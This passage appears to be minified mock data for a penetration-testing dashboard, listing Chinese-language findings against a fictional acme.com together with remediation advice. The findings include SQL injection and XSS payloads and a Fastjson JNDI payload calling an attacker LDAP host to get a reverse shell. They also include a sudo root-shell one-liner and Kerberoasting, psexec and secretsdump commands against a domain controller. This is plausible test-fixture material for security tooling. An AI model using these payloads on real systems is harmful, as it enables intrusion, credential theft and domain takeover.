//10.10.10.20:8080/script",method:"GET",status_code:200,last_seen:"2026-07-25T21:35:00Z"}];function a(e){let t=o.find(t=>t.id===e);if(!t)throw Error(`mock assetRef: unknown asset ${e}`);return{id:String(e),type:t.type,label:t.url||t.domain||t.ip||t.app_name||String(e)}}o.reduce((e,t)=>(e[t.type]=(e[t.type]??0)+1,e),{});let d=[{id:"f-1",assets:[a(18)],vulnclass:"SQL Injection",name:"官网搜索接口报错型 SQL 注入",severity:"high",status:"pending",report:'## 漏洞概述\n\n`www.acme.com/search` 的 `q` 参数存在**报错型 SQL 注入**（MSSQL），可读取数据库版本、库结构乃至敏感数据。\n\n## 影响\n\n- 可读取 `acme_prod` 库的表结构与用户/订单数据\n- 报错回显便于快速构造利用，风险高\n\n## 复现步骤\n\n1. 触发报错注入：\n\n```\nGET /search?q=1\' AND 1=CONVERT(int,@@version)--\n```\n\n2. 响应回显 MSSQL 版本报错，确认可注入\n3. 进一步枚举库：`sqlmap -u "https://www.acme.com/search?q=1" --dbs`\n\n## 修复建议\n\n- 全部改用参数化查询/预编译语句，杜绝字符串拼接\n- 关闭生产环境详细报错回显\n- 数据库账号最小权限，禁用 `xp_cmdshell` 等危险扩展\n',summary:"www.acme.com/search q 参数存在报错型 SQL 注入",evidence:"GET /search?q=1' AND 1=CONVERT(int,@@version)-- → 返回 MSSQL 版本报错，可读库结构。",intent_id:"i-2",task_id:"t-acme-web",task_description:"Acme 官网与后台外部渗透",ts:"2026-07-26T01:20:00Z"},{id:"f-2",assets:[a(15)],vulnclass:"IDOR",severity:"high",status:"pending",summary:"api.acme.com/v1/orders?id= 可越权读取他人订单",evidence:"将 id=1001 改为 id=1002 返回他人订单（含收货地址、手机号），无归属校验。",intent_id:"i-5",task_id:"t-acme-api",task_description:"api.acme.com 越权与注入测试",ts:"2026-07-26T02:44:00Z"},{id:"f-3",assets:[a(3)],vulnclass:"Weak JWT",severity:"high",status:"pending",summary:"API JWT 使用弱密钥、可离线爆破伪造",evidence:"HS256，密钥 'secret'，john 5 秒破解 → 可伪造任意 sub 越权。",task_id:"t-acme-api",task_description:"api.acme.com 越权与注入测试",ts:"2026-07-26T03:02:00Z"},{id:"f-4",assets:[a(18)],vulnclass:"Reflected XSS",severity:"medium",status:"pending",summary:"搜索页对 q 参数未转义，反射型 XSS",evidence:"q=<script>alert(document.domain)</script> 原样回显于结果标题。",task_id:"t-acme-web",task_description:"Acme 官网与后台外部渗透",ts:"2026-07-25T22:10:00Z"},{id:"f-5",assets:[a(2)],vulnclass:"Exposed .git",severity:"medium",status:"pending",summary:"www.acme.com 暴露 .git 目录，可还原源码",evidence:"GET /.git/HEAD → 200；git-dumper 还原出后端源码与数据库连接串注释。",task_id:"t-acme-web",task_description:"Acme 官网与后台外部渗透",ts:"2026-07-25T20:30:00Z"},{id:"f-6",assets:[a(17)],vulnclass:"Default Credentials",severity:"high",status:"pending",summary:"admin.acme.com 后台默认口令 admin/admin123",evidence:"登录成功，进入管理后台，可管理用户与订单。",intent_id:"i-3",task_id:"t-acme-web",task_description:"Acme 官网与后台外部渗透",ts:"2026-07-26T03:50:00Z"},{id:"f-7",assets:[a(17)],vulnclass:"Open Redirect",severity:"low",status:"pending",summary:"登录后 next 参数任意跳转",evidence:"/login?next=https://evil.example 登录后 302 跳到外站。",task_id:"t-acme-web",task_description:"Acme 官网与后台外部渗透",ts:"2026-07-25T19:12:00Z"},{id:"f-8",assets:[a(17)],vulnclass:"Missing Rate Limit",severity:"medium",status:"pending",summary:"登录接口无速率限制，可暴力破解",evidence:"1000 次/分钟无锁定，无验证码。",task_id:"t-acme-web",task_description:"Acme 官网与后台外部渗透",ts:"2026-07-25T18:40:00Z"},{id:"f-9",assets:[a(16)],vulnclass:"Verbose Error",severity:"low",status:"pending",summary:"API 500 返回堆栈，泄露路径与框架版本",evidence:"触发 500 返回 Node.js 堆栈，泄露绝对路径与依赖版本。",task_id:"t-acme-api",task_description:"api.acme.com 越权与注入测试",ts:"2026-07-25T23:05:00Z"},{id:"f-10",assets:[a(4)],vulnclass:"Outdated Component",severity:"medium",status:"pending",summary:"shop 使用存在已知 RCE 的老版本组件",evidence:"指纹识别到组件 v2.3.1，对应 CVE-2024-xxxx 反序列化 RCE。",task_id:"t-shop-pay",task_description:"shop.acme.com 支付与订单链路",ts:"2026-07-23T15:00:00Z"},{id:"f-11",vulnclass:"Hardcoded Credentials",severity:"high",status:"pending",summary:"泄露源码中硬编码数据库凭据 sa/Acme@2021",evidence:"git-dumper 还原 www.acme.com/.git 得到 config.php，内含明文 DB 口令，后续被证实可在内网复用。",intent_id:"ig",task_id:"t-acme-web",task_description:"Acme 官网与后台外部渗透",ts:"2026-07-25T20:36:00Z"},{id:"f-12",assets:[a(4)],vulnclass:"Deserialization RCE",name:"shop 商城 Fastjson 反序列化远程命令执行",severity:"critical",status:"confirmed",report:'## 漏洞概述\n\n`shop.acme.com` 的 `/api/import` 接口使用 **Fastjson 1.2.24** 解析用户可控 JSON，未开启 `safeMode`，可通过 `@type` 指定任意类触发 **JNDI 注入 → 远程命令执行**。\n\n## 影响\n\n- 攻击者无需认证即可在 DMZ Web 服务器上执行任意命令（`www-data@dmz-web01`）\n- 结合后续提权，成为进入内网的跳板\n\n## 复现步骤\n\n1. 构造 JNDI payload：\n\n```json\n{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}\n```\n\n2. `POST /api/import`，`Content-Type: application/json`\n3. 目标回连 dnslog，落地反弹 shell\n\n## 修复建议\n\n- 升级 Fastjson 至 **1.2.83+** 并开启 `safeMode`\n- `/api/import` 增加鉴权与来源校验\n- 出网限制：禁止业务服务器主动外联 LDAP/RMI\n',summary:"shop.acme.com Fastjson 1.2.24 反序列化远程命令执行",evidence:"POST /api/import 提交 JNDI payload（@type:JdbcRowSetImpl）→ 回连 dnslog 并落地反弹 shell（www-data@dmz-web01）。",intent_id:"i7",task_id:"t-acme-web",task_description:"Acme 官网与后台外部渗透",ts:"2026-07-25T15:40:00Z"},{id:"f-13",assets:[a(19)],vulnclass:"Privilege Escalation",severity:"high",status:"pending",summary:"DMZ 立足点 sudo NOPASSWD 错配可本地提权 root",evidence:"sudo -l 显示 (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'os.setuid(0);os.system(\"/bin/sh\")' 直接拿 root。",intent_id:"i8",task_id:"t-acme-web",task_description:"Acme 官网与后台外部渗透",ts:"2026-07-25T16:20:00Z"},{id:"f-14",assets:[a(19),a(21)],vulnclass:"Network Segmentation",severity:"medium",status:"pending",summary:"DMZ 主机双网卡直连内网，边界隔离失效",evidence:"dmz-web01 第二网卡在 10.10.10.0/24，可从 DMZ 直达域控/文件服务器/Jenkins，越过网络分区。",intent_id:"i9",task_id:"t-acme-web",task_description:"Acme 官网与后台外部渗透",ts:"2026-07-25T21:00:00Z"},{id:"f-15",assets:[a(26)],vulnclass:"Unauthenticated RCE",severity:"high",status:"pending",summary:"内部 Jenkins 未授权 Script Console 远程命令执行",evidence:"GET /script 无需登录即可执行 Groovy：'whoami'.execute().text → SYSTEM；并从凭据库导出域账号 acme\\svc_deploy。",intent_id:"i11",task_id:"t-acme-web",task_description:"Acme 官网与后台外部渗透",ts:"2026-07-25T21:50:00Z"},{id:"f-16",assets:[a(21)],vulnclass:"Kerberoasting",severity:"high",status:"pending",summary:"域服务账号 svc_sql 可被 Kerberoast 且口令弱",evidence:"GetUserSPNs 请求 svc_sql 的 TGS，hashcat -m 13100 离线破出 Sql@2020，该账号属于 SQL 管理组。",intent_id:"i12",task_id:"t-acme-web",task_description:"Acme 官网与后台外部渗透",ts:"2026-07-25T23:20:00Z"},{id:"f-17",assets:[a(20)],vulnclass:"Domain Compromise",name:"内网域控 DC01 完全控制（Domain Admin）",severity:"critical",status:"confirmed",report:"## 漏洞概述\n\n经外网 Fastjson RCE 立足 DMZ，再由 sudo 提权、双网卡穿透、Jenkins 未授权 RCE 拿到域账号 `svc_deploy`；该账号属于 **Domain Admins**，最终完全控制域控 **DC01**。\n\n## 影响\n\n- 取得域管理员权限，可控制全域主机与账号\n- `secretsdump` 导出全域 NTLM 哈希（含 `krbtgt`），可制作黄金票据长期潜伏\n- 内部靶标达成\n\n## 复现步骤\n\n1. 以 `svc_deploy` 登录并导出哈希：\n\n```\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\n2. 获得 DC01 的 SYSTEM 权限，导出域内全部哈希\n\n## 修复建议\n\n- 收敛服务账号权限，移出 Domain Admins，落实分层管理（tiering）\n- 连续两次重置 `krbtgt`，轮换服务账号强口令\n- 修复 DMZ→内网边界隔离与前述 RCE/提权链\n",summary:"拿下域控 DC01（Domain Admin）—— 内部靶标达成",evidence:"svc_deploy 属于 Domain Admins，psexec.py 以其登录 DC01 得 SYSTEM，secretsdump 导出全域 NTLM 哈希（含 krbtgt），完成靶标控制。",intent_id:"i13",task_id:"t-acme-web",task_description:"Acme 官网与后台外部渗透",ts:"2026-07-26T00:20:00Z"}],l={nodes:[{id:"root",type:"fact",payload:JSON.stringify({summary:"根：acme.com 外网→内网纵深渗透"}),priority:0,state:"origin",origin:"system",ts:"2026-07-24T09:12:00Z"},{id:"g1",type:"goal",payload:JSON.stringify({text:"获取 acme.com 后台管理权限"}),priority:9,state:"met",origin:"goals",ts:"2026-07-24T09:13:00Z"},{id:"g2",type:"goal",payload:JSON.stringify({text:"读取用户敏感数据"}),priority:8,state:"open",origin:"goals",ts:"2026-07-24T09:13:00Z"},{id:"g3",type:"goal",payload:JSON.stringify({text:"从外网突破 DMZ，建立内网立足点"}),priority:9,state:"met",origin:"goals",ts:"2026-07-25T14:10:00Z"},{id:"g4",type:"goal",payload:JSON.stringify({text:"内网横向，拿下内部靶标域控 DC01"}),priority:10,state:"met",origin:"goals",ts:"2026-07-25T20:00:00Z"},{id:"i1",type:"intent",payload:JSON.stringify({summary:"acme.com 子域枚举与端口扫描"}),priority:6,state:"done",origin:"planner",ts:"2026-07-24T09:20:00Z"},{id:"i2",type:"intent",payload:JSON.stringify({summary:"admin 后台默认口令 / 弱口令测试"}),priority:9,state:"done",origin:"planner",ts:"2026-07-26T03:30:00Z"},{id:"i3",type:"intent",payload:JSON.stringify({summary:"枚举后台功能与用户数据接口"}),priority:8,state:"running"